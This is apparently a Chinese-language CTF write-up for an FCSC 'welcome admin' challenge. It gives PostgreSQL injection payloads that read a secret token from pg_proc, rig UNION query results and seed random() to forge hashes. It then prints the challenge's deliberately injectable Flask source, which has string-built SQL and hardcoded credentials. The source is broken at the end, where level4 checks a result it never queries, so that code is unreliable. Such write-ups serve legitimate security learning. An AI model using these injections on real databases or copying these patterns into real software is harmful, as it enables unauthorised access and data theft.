只有真正的专家才能回应这通措辞隐晦的召唤：“3 号 checkout 需要一名 SQL 专家。”

- 构造载荷：查询函数字符串，切片后提取 token，再与空字符串拼接，最后传递到检查 token 的函数中
    1. 从函数表中读取包含 token 的函数字符串
        ```sql
        SELECT prosrc FROM pg_proc WHERE proname='check_password'
        ```
    2. 切片提取，token 为32个十六进制小写字符串，使用正则表达式模式匹配
        ```sql
        SELECT substring(prosrc, '[0-9a-f]{32}')
        ```

    - 或使用组捕获 `= '` 后的32个连续字符，或 `'`（由于第一个 `'` 后即为 token）
        ```
        SELECT substring(prosrc, $$= '(.{32})$$)
        ```
    3. 合并前两步
        ```sql
        SELECT substring(prosrc, '[0-9a-f]{32}') FROM pg_proc WHERE proname='check_password'
        ```
    4. 放置到上下文
        ```sql
        SELECT  check_password('' || (SELECT substring(prosrc, '[0-9a-f]{32}') FROM pg_proc WHERE proname='check_password')) -- '')
        ```

    - 方法1：联合查询返回多行后排序，设置联合查询为第一行
        ```sql
        '' UNION SELECT NULL, NULL ORDER BY 2 DESC LIMIT 1 --
        ```
        - 列2为原始查询的 `''` 以及联合查询的 `NULL`，降序排列使得第一行为联合查询

    - 方法1变体：设置条件使得原始查询无效，仅返回联合查询内容

        ```sql
        '' WHERE 1=0 UNION SELECT NULL, NULL --
        ```
    - 方法2：`random` 使用伪随机数，在第一次执行前尝试设置种子以控制 hash 值（`WHERE` 在 `SELECT` 前执行）。联合查询中即可使用固定数值，也可设置种子后再次生成

        ```sql
        '' || setseed(0) || md5(random()::text) FROM pg_proc WHERE ''=(SELECT '' || setseed(0)) -- 
        ```

from enum import Enum
from functools import wraps
from flask import Flask, abort, redirect, render_template, request, session
from contextlib import contextmanager
import os
import psycopg2
from psycopg2.extensions import cursor

app = Flask(__name__)
app.secret_key = "super_secret_key"

FIRST_FLAG = os.environ.get("FIRST_FLAG", "FCSC{placeholder_flag}")
SECOND_FLAG = os.environ.get("SECOND_FLAG", "FCSC{placeholder_flag}")

class Rank(Enum):
    GUEST = 0
    ADMIN = 1
    SUPER_ADMIN = 2
    HYPER_ADMIN = 3
    TURBO_ADMIN = 4
    FLAG = 5

    @classmethod
    def from_session(cls):
        try:
            return cls(session["rank"])
        except:
            return cls(0)

    def __lt__(self, other):
        return self.value < other.value

def init_db():
    conn = psycopg2.connect(
        database="postgres",
        host="welcome-admin-db",
        user="postgres",
        password="postgres",
        port="5432",
    )

    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM pg_catalog.pg_user WHERE usename = 'ctf'")
    row = cursor.fetchone()
    if row:
        return
    cursor.execute(
        """
        CREATE USER ctf WITH PASSWORD 'ctf';
        REVOKE ALL ON SCHEMA public FROM ctf;
        CREATE SCHEMA ctf;
        GRANT ALL ON SCHEMA ctf TO ctf;
        ALTER USER ctf SET search_path TO ctf;
        """,
    )
    conn.commit()
    conn.close()

@contextmanager
def ctf_cursor():
    conn = psycopg2.connect(
        database="postgres",
        host="welcome-admin-db",
        user="ctf",
        password="ctf",
        port="5432",
    )
    try:
        yield conn.cursor()
    finally:
        conn.rollback()
        conn.close()

def login_for(require_rank: Rank, next_rank: Rank, goto: str, default_msg=""):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            msg = default_msg
            current_rank = Rank.from_session()
            print(current_rank, require_rank)
            if current_rank < require_rank:
                return "You are not allowed to access this page"

            if request.method == "POST":
                password = request.form.get("password", "")
                if ";" in password:
                    return abort(400)
                with ctf_cursor() as cursor:
                    is_success = func(cursor, password)
                    if is_success:
                        session["rank"] = next_rank.value
                        return redirect(goto)
                    else:
                        msg = "Invalid password"
            return render_template(
                "login.html", rank=current_rank, next_rank=next_rank, msg=msg
            )

        return wrapper

    return decorator

# 输入密码与实际密码在 SQL 字符串中进行逻辑运算，返回 true 即通过验证
@app.route("/", methods=["GET", "POST"])
@login_for(Rank.GUEST, Rank.ADMIN, "/admin")
def level1(cursor: cursor, password: str):
    token = os.urandom(16).hex()
    cursor.execute(f"SELECT '{token}' = '{password}'")
    row = cursor.fetchone()
    if not row:
        return False
    if len(row) != 1:
        return False
    return bool(row[0])

# 分离两种密码，但输入密码被拼接到函数参数的字符串中
@app.route("/admin", methods=["GET", "POST"])
@login_for(Rank.ADMIN, Rank.SUPER_ADMIN, "/super-admin", FIRST_FLAG)
def level2(cursor: cursor, password: str):
    # 长度16的字节转为32个字符的十六进制字符串
    token = os.urandom(16).hex()
    cursor.execute(
        f"""
            CREATE FUNCTION check_password(_password text) RETURNS text
            AS $$
                BEGIN
                    IF _password = '{token}' THEN
                        RETURN _password;
                    END IF;
                    RETURN 'nope';
                END;
            $$ 
            IMMUTABLE LANGUAGE plpgsql;
        """
    )
    cursor.execute(f"SELECT  check_password('{password}')")
    row = cursor.fetchone()
    if not row:
        return False
    if len(row) != 1:
        return False
    return row[0] == token

@app.route("/super-admin", methods=["GET", "POST"])
@login_for(Rank.SUPER_ADMIN, Rank.HYPER_ADMIN, "/hyper-admin")
def level3(cursor: cursor, password: str):
    token = os.urandom(16).hex()
    # 无法提取之前的字符串，尝试堆叠查询并提取元数据表中的前一条语句
    cursor.execute(f"SELECT '{token}', '{password}';")
    row = cursor.fetchone()
    if not row:
        return False
    if len(row) != 2:
        return False
    return row[1] == token

@app.route("/hyper-admin", methods=["GET", "POST"])
@login_for(Rank.HYPER_ADMIN, Rank.TURBO_ADMIN, "/turbo-admin")
def level4(cursor: cursor, password: str):
    # 仍然无法提取之前的字符串

    if not row:
        return False
    if len(row) != 2:
        return False
    return row[0] == row[1]
